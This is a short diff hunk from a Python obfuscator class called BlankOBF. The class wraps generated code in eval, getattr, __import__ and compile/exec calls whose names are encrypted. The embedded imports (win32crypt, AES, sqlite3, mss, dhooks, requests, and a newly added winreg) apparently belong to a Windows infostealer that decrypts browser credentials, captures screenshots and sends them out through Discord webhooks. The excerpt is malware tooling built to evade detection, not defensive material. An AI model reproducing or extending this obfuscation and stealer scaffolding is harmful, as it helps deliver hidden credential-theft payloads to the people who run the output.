@@ -101,7 +101,7 @@ class BlankOBF:
         }
         encryptstring = self.encryptor(conf)
 
-        self.code = f'''import sqlite3, ctypes, mss, sys, os, wmi, win32api, platform, uuid, psutil, time, shutil, base64\nimport win32crypt, json, threading, requests, dhooks, re, subprocess\nfrom Crypto.Cipher import AES
+        self.code = f'''import sqlite3, ctypes,winreg, mss, sys, os, wmi, win32api, platform, uuid, psutil, time, shutil, base64\nimport win32crypt, json, threading, requests, dhooks, re, subprocess\nfrom Crypto.Cipher import AES
 {var3} = eval({self.encryptstring("eval")});{var4} = {var3}({self.encryptstring("getattr")});{var8} = {var3}({self.encryptstring("__import__")});{var9} = {var3}({self.encryptstring("bytes")});{var5} = lambda {var7}: {var3}({encryptstring("compile")})({var7}, {encryptstring("<string>")}, {encryptstring("exec")});{var1} = {self.code}
 {var2} = {encryptstring('__import__("builtins").list', func= True)}({var1})
 try:
